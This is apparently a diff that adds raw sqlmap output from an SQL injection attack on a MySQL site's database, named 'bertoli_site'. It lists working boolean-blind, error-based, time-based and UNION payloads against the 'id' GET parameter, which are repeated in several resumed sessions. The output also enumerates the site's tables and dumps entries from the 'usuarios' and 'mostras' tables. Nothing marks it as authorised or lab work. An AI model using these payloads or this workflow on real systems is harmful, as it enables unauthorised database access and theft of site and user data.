@@ -1,0 +1,196 @@
+sqlmap identified the following injection point(s) with a total of 65 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=88 AND 9239=9239
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=88 AND (SELECT 2187 FROM(SELECT COUNT(*),CONCAT(0x71766a7671,(SELECT (ELT(2187=2187,1))),0x7178767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=88 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-7568 UNION ALL SELECT CONCAT(0x71766a7671,0x48475344776d48416a7856617a47667062565a62496c55584257656a694d657567586f5542616165,0x7178767871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wYKc
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] bertoli_site
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=88 AND 9239=9239
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=88 AND (SELECT 2187 FROM(SELECT COUNT(*),CONCAT(0x71766a7671,(SELECT (ELT(2187=2187,1))),0x7178767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=88 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-7568 UNION ALL SELECT CONCAT(0x71766a7671,0x48475344776d48416a7856617a47667062565a62496c55584257656a694d657567586f5542616165,0x7178767871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wYKc
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: bertoli_site
+[6 tables]
++------------+
+| fotos      |
+| mostras    |
+| newsletter |
+| noticias   |
+| projetos   |
+| usuarios   |
++------------+
+
+Database: bertoli_site
++------------+---------+
+| Table      | Entries |
++------------+---------+
+| newsletter | 1105    |
+| fotos      | 386     |
+| noticias   | 29      |
+| projetos   | 12      |
+| mostras    | 4       |
+| usuarios   | 1       |
++------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=88 AND 9239=9239
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=88 AND (SELECT 2187 FROM(SELECT COUNT(*),CONCAT(0x71766a7671,(SELECT (ELT(2187=2187,1))),0x7178767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=88 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-7568 UNION ALL SELECT CONCAT(0x71766a7671,0x48475344776d48416a7856617a47667062565a62496c55584257656a694d657567586f5542616165,0x7178767871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wYKc
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: bertoli_site
+Table: usuarios
+[1 entry]
++---------------------+
+| ultimo_acesso       |
++---------------------+
+| 2018-09-03 17:16:14 |
++---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=88 AND 9239=9239
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=88 AND (SELECT 2187 FROM(SELECT COUNT(*),CONCAT(0x71766a7671,(SELECT (ELT(2187=2187,1))),0x7178767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=88 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-7568 UNION ALL SELECT CONCAT(0x71766a7671,0x48475344776d48416a7856617a47667062565a62496c55584257656a694d657567586f5542616165,0x7178767871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wYKc
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: bertoli_site
+[6 tables]
++------------+
+| fotos      |
+| mostras    |
+| newsletter |
+| noticias   |
+| projetos   |
+| usuarios   |
++------------+
+
+Database: bertoli_site
++------------+---------+
+| Table      | Entries |
++------------+---------+
+| newsletter | 1105    |
+| fotos      | 386     |
+| noticias   | 29      |
+| projetos   | 12      |
+| mostras    | 4       |
+| usuarios   | 1       |
++------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=88 AND 9239=9239
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=88 AND (SELECT 2187 FROM(SELECT COUNT(*),CONCAT(0x71766a7671,(SELECT (ELT(2187=2187,1))),0x7178767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=88 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-7568 UNION ALL SELECT CONCAT(0x71766a7671,0x48475344776d48416a7856617a47667062565a62496c55584257656a694d657567586f5542616165,0x7178767871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wYKc
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: bertoli_site
+Table: mostras
+[4 entries]
++---------+----------+------------+
+| texto   | hora_cad | data_cad   |
++---------+----------+------------+
+| <blank> | 04:03:47 | 2010-03-17 |
+| <blank> | 04:26:11 | 2013-02-24 |
+| <blank> | 09:50:02 | 2010-03-18 |
+| <blank> | 01:49:41 | 2013-11-08 |
++---------+----------+------------+
+
